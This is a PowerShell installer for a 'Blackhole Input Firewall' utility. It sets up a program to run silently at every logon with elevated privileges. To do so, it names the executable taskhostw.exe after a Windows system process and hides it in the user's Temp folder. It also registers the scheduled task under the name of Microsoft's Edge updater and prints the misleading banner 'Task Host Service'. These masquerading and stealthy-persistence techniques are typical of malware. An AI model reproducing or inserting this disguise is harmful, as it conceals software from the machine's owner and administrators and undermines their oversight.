# ============================================================================
# Blackhole Input Firewall - Installation Script (PowerShell)
# Installs the service to auto-start on Windows boot via Task Scheduler
# ============================================================================

param(
    [switch]$Dev
)

# Require administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERROR: This script must be run as Administrator." -ForegroundColor Red
    Write-Host "Please right-click and select 'Run as Administrator'."
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "========================================"
Write-Host "  Task Host Service - Install"
Write-Host "========================================"
Write-Host ""

# Check if executable exists
if (-not (Test-Path "dist\taskhostw.exe")) {
    Write-Host "ERROR: taskhostw.exe not found in dist\ directory." -ForegroundColor Red
    Write-Host "Please run build.ps1 first to create the executable."
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

# Define installation paths
$InstallDir = "$env:LOCALAPPDATA\Temp"
$ExePath = "$InstallDir\taskhostw.exe"
$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"

Write-Host "[1/4] Creating installation directory"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}
Write-Host "  - Directory: $InstallDir"
Write-Host ""

Write-Host "[2/4] Copying executable"
Copy-Item "dist\taskhostw.exe" $ExePath -Force
if (-not (Test-Path $ExePath)) {
    Write-Host "ERROR: Failed to copy executable." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}
Write-Host "  - Copied: taskhostw.exe"
Write-Host ""

# Handle .dev_mode marker
if ($Dev) {
    Write-Host "[3/4] Copying .dev_mode marker (DEV MODE)"
    
    # Check if .dev_mode exists in dist folder (from build)
    if (Test-Path "dist\.dev_mode") {
        Copy-Item "dist\.dev_mode" "$InstallDir\.dev_mode" -Force
        Write-Host "  - Copied: .dev_mode marker from dist folder"
    } else {
        # Create it if it doesn't exist (fallback)
        New-Item -ItemType File -Path "$InstallDir\.dev_mode" -Force | Out-Null
        Write-Host "  - Created: .dev_mode marker (fallback)"
    }
    
    Write-Host "  - Console window will be VISIBLE"
    Write-Host ""
} else {
    Write-Host "[3/4] Removing .dev_mode marker (PRODUCTION MODE)"
    
    # Delete marker from install dir if it exists
    if (Test-Path "$InstallDir\.dev_mode") {
        Remove-Item "$InstallDir\.dev_mode" -Force
        Write-Host "  - Removed: .dev_mode marker from install directory"
    }
    
    # Also clean up dist folder if it exists
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host "  - Removed: .dev_mode marker from dist folder"
    }
    
    Write-Host "  - Service will run SILENTLY in background"
    Write-Host ""
}

Write-Host "[4/4] Creating Task Scheduler service"

# Delete existing task if it exists
$existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Write-Host "  - Removing existing task"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# Create new task
$action = New-ScheduledTaskAction -Execute $ExePath
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
    Write-Host "ERROR: Failed to create Task Scheduler entry." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "  - Task created: $TaskName"
Write-Host "  - Trigger: At user logon"
Write-Host "  - User: $env:USERNAME"
Write-Host ""

Write-Host "[5/5] Starting service"
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 2

$task = Get-ScheduledTask -TaskName $TaskName
if ($task.State -eq "Running") {
    Write-Host "  - Service started successfully" -ForegroundColor Green
} else {
    Write-Host "  - Warning: Service scheduled but not running yet" -ForegroundColor Yellow
    Write-Host "  - Service will start on next system boot"
}
Write-Host ""

Write-Host "========================================"
Write-Host "  Installation Complete!"
Write-Host "========================================"
Write-Host ""
if ($Dev) {
    Write-Host "Mode: DEV (console visible)"
} else {
    Write-Host "Mode: PRODUCTION (silent background service)"
}
Write-Host ""
Write-Host "Service: $TaskName"
Write-Host "Location: $ExePath"
Write-Host "Hotkey: Win+Shift+F (toggle firewall)"
Write-Host ""
Write-Host "To uninstall: .\uninstall.ps1"
Write-Host ""

Read-Host "Press Enter to exit"

